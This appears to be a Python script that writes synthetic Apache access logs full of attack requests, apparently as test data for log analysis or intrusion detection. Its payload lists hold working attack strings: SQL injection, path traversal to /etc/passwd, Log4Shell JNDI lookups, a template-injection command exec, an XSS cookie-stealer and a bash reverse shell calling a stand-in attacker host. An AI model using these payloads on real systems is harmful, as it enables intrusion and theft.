#!/usr/bin/env python3
"""
Synthetic Malicious Apache Log Generator - Final Comprehensive Edition v2
Generates diverse, realistic attack patterns across multiple vectors (URI, Headers)
and includes modern attack types like Log4Shell and SSTI, now with request time.
"""

import argparse
import gzip
import random
import sys
import urllib.parse
import base64
from datetime import datetime, timedelta
from pathlib import Path
from faker import Faker
from ipaddress import IPv4Address
from random import getrandbits

class MaliciousLogGenerator:
    def __init__(self):
        self.faker = Faker()

        # A03:2021 – Injection: SQL Injection
        self.sql_injection_techniques = {
            'auth_bypass': ["' OR '1'='1", "' OR 1=1--", "admin' #"],
            'union_based': ["' UNION SELECT NULL,version(),NULL--", "1 UNION SELECT username,password FROM users--"],
            'time_based': ["' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--"],
            'obfuscated': ["1'/**/or/**/1=1--", "'%0Aor%0A1=1--"]
        }

        # A03:2021 – Injection: Cross-Site Scripting (XSS)
        self.xss_payloads = {
            'basic': ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"],
            'encoded': [
                "data:text/html;base64," + base64.b64encode(b"<script>alert(1)</script>").decode('utf-8'),
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"
            ],
            'cookie_stealing': ["<script>new Image().src='http://attacker.com/s?c='+document.cookie</script>"],
            'context_breakout': ["' autofocus onfocus='alert(1)'", "';alert(1)//"]
        }

        # A01:2021 – Broken Access Control: Path Traversal
        self.traversal_payloads = {
            'unix': ["../../../etc/passwd", "../../../../etc/shadow"],
            'windows': ["..\\..\\..\\..\\windows\\win.ini", "..\\..\\..\\boot.ini"],
            'encoded': ["..%2f..%2f..%2fetc%2fpasswd", "..%c0%af..%c0%afetc%c0%afpasswd"],
            'php_wrappers': ["php://filter/convert.base64-encode/resource=/etc/passwd"]
        }

        # A03:2021 – Injection: OS Command Injection (RCE)
        self.rce_payloads = {
            'basic': ["; ls -la", "| cat /etc/passwd", "&& whoami"],
            'substitution': ["$(cat /etc/passwd)", "`whoami`"],
            'reverse_shell': ["; bash -i >& /dev/tcp/attacker.com/4444 0>&1"],
            'bypass_tricks': ["cat /e?c/pa??wd", "; w`g`et http://attacker.com/s.sh"]
        }
        
        # Log4Shell / JNDI Injection Payloads
        self.log4shell_payloads = {
            'basic_jndi': ["${jndi:ldap://attacker.com/a}", "${jndi:dns://attacker.com/a}"],
            'obfuscated_jndi': ["${${lower:j}ndi:ldap://attacker.com/a}", "${jndi:${lower:l}${lower:d}ap://attacker.com/a}"]
        }

        # Server-Side Template Injection (SSTI) Payloads
        self.ssti_payloads = {
            'basic_ssti': ["{{7*7}}", "${7*7}"],
            'command_exec_ssti': ["{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('id')}}"]
        }

        self.sql_parameters = ['id', 'user', 'q', 'search', 'category']
        self.xss_parameters = ['q', 'search', 'name', 'comment', 'redirect_url']
        self.file_parameters = ['file', 'path', 'page', 'include', 'view']
        self.rce_parameters = ['cmd', 'exec', 'ping', 'host', 'query']
        
        self.vulnerable_endpoints = ['/search.php', '/product.php', '/user.php', '/page.php', '/api/v1/user', '/view', '/download.php']

    def _sanitize_for_log(self, text: str) -> str:
        return text.replace('"', "'")

    def generate_ip(self):
        return str(IPv4Address(getrandbits(32)))

    def generate_timestamp(self, base_time):
        dt_str = base_time.strftime('%d/%b/%Y:%H:%M:%S')
        offset_hours = random.randint(-11, 12)
        offset_minutes = random.choice([0, 15, 30, 45])
        tz = f"{offset_hours:+03d}{offset_minutes:02d}"
        return f"{dt_str} {tz}"

    def generate_user_agent(self):
        return self._sanitize_for_log(self.faker.user_agent())

    def encode_payload(self, payload):
        if random.choice([True, False]):
            return urllib.parse.quote(payload)
        return payload

    def generate_attack_log(self, attack_type, timestamp):
        attack_map = {
            'sql_injection': (self.sql_injection_techniques, self.sql_parameters),
            'xss': (self.xss_payloads, self.xss_parameters),
            'directory_traversal': (self.traversal_payloads, self.file_parameters),
            'command_injection': (self.rce_payloads, self.rce_parameters),
            'log4shell': (self.log4shell_payloads, self.xss_parameters),
            'ssti': (self.ssti_payloads, self.xss_parameters)
        }

        if attack_type not in attack_map:
            raise ValueError(f"Unknown attack type: {attack_type}")

        techniques, params = attack_map[attack_type]
        
        technique_key = random.choice(list(techniques.keys()))
        payload = random.choice(techniques[technique_key])
        
        if 'attacker.com' in payload:
            attacker_domain = self.faker.domain_name()
            payload = payload.replace('attacker.com', attacker_domain)
        
        encoded_payload = self.encode_payload(payload)
        
        injection_vector = random.choice(['uri', 'uri', 'uri', 'referer', 'user_agent'])
        
        ip = self.generate_ip()
        ts = self.generate_timestamp(timestamp)
        method = random.choice(["GET", "POST"])
        endpoint = random.choice(self.vulnerable_endpoints)
        response_code = random.choice(['200', '403', '500', '404'])
        size = random.randint(100, 9000)
        # NEW: Add request time in microseconds
        request_time_us = random.randint(50000, 2500000) # 50ms to 2.5s

        uri = endpoint
        referer = f"https://{self.faker.domain_name()}/"
        user_agent = self.generate_user_agent()

        if injection_vector == 'uri':
            param = random.choice(params)
            uri = f"{endpoint}?{param}={encoded_payload}"
        elif injection_vector == 'referer':
            referer = encoded_payload
        elif injection_vector == 'user_agent':
            user_agent = encoded_payload

        safe_uri = self._sanitize_for_log(uri)
        safe_referer = self._sanitize_for_log(referer)
        safe_user_agent = self._sanitize_for_log(user_agent)

        # UPDATED: The log format now includes all standard fields plus request time
        return (
            f'{ip} - - [{ts}] '
            f'"{method} {safe_uri} HTTP/1.1" '
            f'{response_code} {size} '
            f'"{safe_referer}" '
            f'"{safe_user_agent}" '
            f'{request_time_us}' # Added request time
        )

def main():
    parser = argparse.ArgumentParser(description="Generate comprehensive malicious Apache access logs.")
    parser.add_argument('-n', '--num-lines', type=int, default=1000, help='Number of log lines (default: 1000)')
    parser.add_argument('-o', '--output', type=str, help='Output file path')
    parser.add_argument('--gzip', action='store_true', help='Compress output with gzip')
    
    args = parser.parse_args()
    generator = MaliciousLogGenerator()
    
    attack_types = ['sql_injection', 'xss', 'directory_traversal', 'command_injection', 'log4shell', 'ssti']
    
    start_time = datetime.now()

    if args.output:
        output_path = Path(args.output)
    else:
        timestamp_str = start_time.strftime('%Y%m%d_%H%M%S')
        ext = '.log.gz' if args.gzip else '.log'
        output_path = Path(f"malicious_traffic_{timestamp_str}{ext}")

    try:
        output_file = gzip.open(output_path, 'wt', encoding='utf-8') if args.gzip else open(output_path, 'w', encoding='utf-8')
        
        print(f"Generating {args.num_lines:,} malicious logs to {output_path}...")
        
        current_time = start_time
        for i in range(args.num_lines):
            attack_type = random.choice(attack_types)
            log_line = generator.generate_attack_log(attack_type, current_time)
            output_file.write(log_line + '\n')
            
            increment = random.uniform(0.1, 5)
            current_time += timedelta(seconds=increment)

            if (i + 1) % max(1, args.num_lines // 10) == 0:
                progress = ((i + 1) / args.num_lines) * 100
                print(f"  Progress: {progress:.0f}% ({i + 1:,}/{args.num_lines:,})", file=sys.stderr)

        print(f"\n✓ Generation complete. Output: {output_path}")

    finally:
        if 'output_file' in locals() and output_file:
            output_file.close()

if __name__ == "__main__":
    main()
